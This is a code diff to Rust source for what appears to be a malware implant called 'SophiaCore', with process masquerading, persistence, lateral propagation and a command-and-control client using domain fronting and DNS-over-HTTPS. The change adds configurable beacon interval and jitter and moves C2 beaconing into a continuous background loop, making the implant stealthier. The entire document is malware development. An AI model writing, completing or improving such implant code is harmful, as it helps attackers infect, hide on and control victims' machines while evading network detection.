@@ -55,6 +55,8 @@ struct SophiaConfig {
     enable_lateral: bool,
     enable_plugins: bool,
     max_propagation_depth: u32,
+    beacon_interval: u64,
+    jitter_percent: u32,
 }
 
 impl Default for SophiaConfig {
@@ -70,6 +72,8 @@ impl Default for SophiaConfig {
             enable_lateral: false,
             enable_plugins: true,
             max_propagation_depth: 3,
+            beacon_interval: 60,
+            jitter_percent: 20,
         }
     }
 }
@@ -139,7 +143,7 @@ impl SophiaCore {
         }
         Ok(())
     }
-    
+
     fn masquerade(&self) -> Result<()> {
         let masquerade = ProcessMasquerade::new(None);
         masquerade.masquerade_current_process()?;
@@ -159,7 +163,7 @@ impl SophiaCore {
         }
         Ok(())
     }
-    
+
     fn setup_persistence(&self) -> Result<()> {
         let current_exe = std::env::current_exe()?;
         let persistence = PersistenceManager::new(current_exe)?;
@@ -196,7 +200,7 @@ impl SophiaCore {
         manager.start_propagation(payload)?;
         Ok(())
     }
-    
+
     fn run(&mut self) -> Result<()> {
         self.initialize()?;
         let mut session_key = [0u8; 32];
@@ -209,19 +213,23 @@ impl SophiaCore {
             fronting_domain: self.config.fronting_domain.clone(),
             doh_server: self.config.doh_server.clone(),
             session_key,
-            jitter_lambda: 2.0,
+            beacon_interval: self.config.beacon_interval,
+            jitter_percent: self.config.jitter_percent,
         };
         let mut c2_client = c2::C2Client::new(c2_config)?;
         let rt = tokio::runtime::Runtime::new()?;
-        rt.block_on(async {
-            c2_client.connect().await?;
-            c2_client.send_beacon(&self.session_id).await?;
-            Ok::<(), anyhow::Error>(())
-        })?;
+        let session_id = self.session_id.clone();
+
+        rt.spawn(async move {
+            if let Ok(_) = c2_client.connect().await {
+                let _ = c2_client.run_beacon_loop(&session_id).await;
+            }
+        });
+
         self.main_loop(&cipher)?;
         Ok(())
     }
-    
+
     fn main_loop(&mut self, cipher: &SophiaCipher) -> Result<()> {
         let mut iteration_count: u64 = 0;
         loop {
